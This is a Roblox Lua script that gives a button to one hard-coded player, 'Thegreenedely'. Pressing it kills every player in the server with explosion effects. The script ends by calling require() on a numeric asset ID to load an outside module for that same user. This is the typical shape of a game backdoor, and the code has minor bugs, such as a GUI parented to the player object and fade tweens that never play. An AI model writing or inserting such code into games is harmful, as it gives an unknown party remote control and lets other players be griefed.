local findplayer = game.Players:FindFirstChild("Thegreenedely")
if findplayer then
	local gui = Instance.new("ScreenGui")
	local frame= Instance.new("Frame")
	local label = Instance.new("TextButton")
	gui.Enabled = true
	gui.Parent = findplayer
	frame.Parent = gui
	frame.Size = UDim2.new(0.25, 0, 0.125, 0)
	frame.Position = UDim2.new(0.75,0, 0.4,0)
	label.Text = "Kaboom"
	label.Size = UDim2.new(1,0, 1,0)
	label.Parent = frame

	label.MouseButton1Up:Connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if v:IsA("Player") then
				v.Character.Humanoid.Health = 0
				local explosion = Instance.new("Part")
				explosion.Size = Vector3.new(1,1,1)*0.1
				explosion.Color = Color3.new(1, 0.717647, 0)
				explosion.Shape = Enum.PartType.Ball
				explosion.Material = Enum.Material.Neon
				explosion.Anchored = true
				explosion.CanCollide = false
				explosion.Parent = workspace
				explosion.CFrame = v.Character.HumanoidRootPart.CFrame
				local ts = game:GetService("TweenService")
				local tween = ts:Create(explosion, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0), {Size = Vector3.new(25,25,25)})
				tween:Play()
				local tween = ts:Create(explosion, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0), {Transparency = 1})
				local explosion2 = Instance.new("Part")
				explosion2.Size = Vector3.new(1,1,1)*0.2
				explosion2.Color = Color3.new(1, 0.717647, 0)
				explosion2.Shape = Enum.PartType.Ball
				explosion2.Material = Enum.Material.ForceField
				explosion2.Anchored = true
				explosion2.CanCollide = false
				explosion2.Parent = workspace
				explosion2.CFrame = v.Character.HumanoidRootPart.CFrame
				local ts = game:GetService("TweenService")
				local tween = ts:Create(explosion2, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0), {Size = Vector3.new(30,30,30)})
				tween:Play()
				local tween = ts:Create(explosion2, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0), {Transparency = 1})

				game.Debris:AddItem(explosion, 2.5)
				game.Debris:AddItem(explosion2, 2.5)
				print("kaboom ".. v.Name)

			end
		end
	end)
  require(126564778569352).load("TheGreenedely")
end
